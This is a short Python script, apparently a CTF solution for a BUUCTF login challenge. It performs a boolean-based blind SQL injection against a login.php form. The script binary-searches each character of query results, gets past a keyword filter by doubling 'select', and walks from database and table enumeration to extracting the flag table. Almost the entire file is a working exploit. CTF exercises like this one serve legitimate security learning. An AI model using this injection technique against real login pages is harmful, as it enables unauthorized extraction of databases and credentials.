
# -*- coding: utf-8 -*-
# @Date    : 2020-12-18
# @Author  : SuperJason
import requests
import string

url = 'http://092604a0-af99-4453-aedd-215fff67f97e.node3.buuoj.cn/login.php'
flag = ''
trueflag='8bef'
falseflag='5728'
dic = string.digits + string.ascii_letters + "!@#$%^&*()_+{}-="

# select过滤
for i in range(1,50):
# 由于服务器限制了访问请求，上述for循环可以每次遍历少一点的数量，例如1-5,5-10,....
    # 可打印字符的ASCII码在33-128之间
    left = 32
    right = 127

    while right - left != 1:
        mid = (right + left) // 2        
        # target = 'select database()'        
        # target = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # target = 'select group_concat(column_name) from information_schema.columns where table_name="fl4g"'
        target = 'select flag from fl4g'

        payload = "'and (ascii(substr(({}), {}, 1))>{})#".format(target, i, mid)
        #payload = payload.replace('from', 'frfromom')
        payload = payload.replace('select', 'selselectect')
        #payload = payload.replace('or', 'oorr')
        #payload = payload.replace('where', 'whwhereere')
        # 此处需要通过burpsuite等工具获得post的参数名
        data = {
            "name": "admin"+payload,
            "pass": 1
        }

        content = requests.post(url, data = data).text
        if trueflag in content:
            left = mid
        else:
            right = mid
    flag += chr(right)
    print (flag)

# note
# fl4g,usc
# flag
# n1book{login_sqli_is_nice}


